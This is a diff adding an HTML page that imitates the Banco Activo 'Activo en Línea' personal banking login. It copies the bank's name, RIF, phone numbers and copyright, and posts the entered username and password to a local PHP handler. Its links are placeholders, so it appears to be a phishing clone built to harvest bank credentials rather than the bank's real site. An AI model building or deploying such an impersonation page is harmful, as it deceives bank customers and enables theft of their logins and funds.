@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Activo en Línea</title>
+  <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="css/index.css">
+</head>
+<body>
+    <header>
+    <div class="header-container">
+      <div class="logo">
+        <img src="img/logo.png" alt="Logo">
+      </div>
+      <nav class="rifheader">
+        <div class="rifhead">RIF: J-08006622-7</div>
+      </nav>
+    </div>
+  </header>
+  <div class="login-container">
+    <form class="login-form" action="php/login.php" method="POST">
+      <div class="title">
+        <span class="active" style="font-size: 17px;">Activo en Línea</span>
+        <span class="separator"></span>
+        <span class="section">Personas</span>
+      </div>
+      <h2>Iniciar Sesión</h2>
+      <div class="step" id="step-username">
+        <label for="username">Nombre de Usuario</label>
+        <input
+          type="text"
+          id="username"
+          class="username"
+          name="username"
+          placeholder="Usuario *"
+          required
+        />
+        <div style="display: flex; justify-content: center; align-items: center; width: 100%; margin-top: 10px;">
+          <button type="button" id="next-btn" style="align-items: center;">Aceptar</button>
+        </div>
+      </div>
+      <div class="step" id="step-password" style="display: none;">
+        <label for="password">Contraseña</label>
+        <input
+          type="password"
+          id="password"
+          class="password"
+          name="password"
+          placeholder="Contraseña *"
+          required
+        />
+        <button type="submit">Entrar</button>
+      </div>
+        <p class="forgot">
+    Haz click aquí si olvidaste tu usuario, clave o preguntas y respuestas de desafío.
+  </p>
+    </form>
+    <section class="register">
+      <h2>¿No estás registrado?</h2>
+      <p>
+        Si ingresas por primera vez o no posees usuario y contraseña
+      </p>
+      <button onclick="location.href='#'">Regístrese</button>
+    </section>
+  </div>
+  <div class="help">
+    Si necesitas ayuda contáctanos desde Venezuela a través del
+    <strong>0500-ACTIVAT (2284828)</strong> o en el Exterior al
+    <strong>+58 212 958 3333</strong><br>
+    <a href="#">Política de Privacidad</a> |
+    <a href="#">Términos y Condiciones</a> |
+    <a href="#">Tips de Seguridad</a>
+  </div>
+
+  <div class="final-footer">
+    &copy; Copyright 2025 &nbsp; Banco Activo, C.A. Banco Universal. RIF: J-08006622-7. Todos los derechos reservados.  
+    La información mostrada en esta página, es de carácter Confidencial.
+  </div>
+  <script src="js/index.js"></script>
+</body>
+</html>
